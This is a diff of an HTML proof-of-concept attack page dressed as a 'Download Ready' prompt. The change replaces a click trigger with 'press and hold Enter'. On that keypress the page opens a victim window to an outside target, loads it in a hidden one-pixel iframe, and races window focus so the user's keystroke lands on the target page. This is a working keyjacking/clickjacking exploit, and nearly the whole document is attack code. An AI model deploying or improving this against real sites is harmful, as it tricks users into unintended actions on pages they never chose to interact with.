@@ -4,11 +4,11 @@
 <body style="background:#f5f5f5;font-family:sans-serif;text-align:center;padding-top:200px;">
 
     <h2>Download Ready</h2>
-    <p>Your file is ready. Click below to continue.</p>
+    <p>Press and hold <b>Enter</b> to continue</p>
 
     <button id="btn"
-        style="padding:15px 30px;font-size:18px;border:none;border-radius:10px;background:#4CAF50;color:white;cursor:pointer;">
-        Download Now
+        style="padding:15px 30px;font-size:18px;border:none;border-radius:10px;background:#4CAF50;color:white;">
+        Continue
     </button>
 
     <iframe id="ghostFrame" style="width:1px;height:1px;opacity:0;"></iframe>
@@ -16,22 +16,25 @@
     <script>
         const targetURL = "https://read-poc.vercel.app/";
         let victim = null;
+        let started = false;
 
-        const btn = document.getElementById("btn");
         const ghost = document.getElementById("ghostFrame");
 
-        btn.addEventListener("mousedown", () => {
-            console.log("[*] mousedown → open victim");
+        document.addEventListener("keydown", (e) => {
+            if (e.key !== "Enter") return;
+            if (e.repeat || started) return;
+
+            started = true;
+            console.log("[*] keydown → start chain");
             victim = window.open(targetURL, "_blank");
-
             ghost.src = targetURL;
-
-            startFocusBounce();
+            startFocusRace();
         });
 
-        btn.addEventListener("mouseup", () => {
-            console.log("[*] mouseup → shift activation");
+        document.addEventListener("keyup", (e) => {
+            if (e.key !== "Enter") return;
 
+            console.log("[*] keyup → shift activation");
             if (victim) {
                 try {
                     victim.focus();
@@ -39,7 +42,7 @@
             }
         });
 
-        function startFocusBounce() {
+        function startFocusRace() {
             const interval = setInterval(() => {
                 if (!victim || victim.closed) {
                     clearInterval(interval);
@@ -51,8 +54,7 @@
                     window.focus();
                 } catch (e) {}
             }, 50);
-
-            setTimeout(() => clearInterval(interval), 1000);
+            setTimeout(() => clearInterval(interval), 1200);
         }
     </script>
 
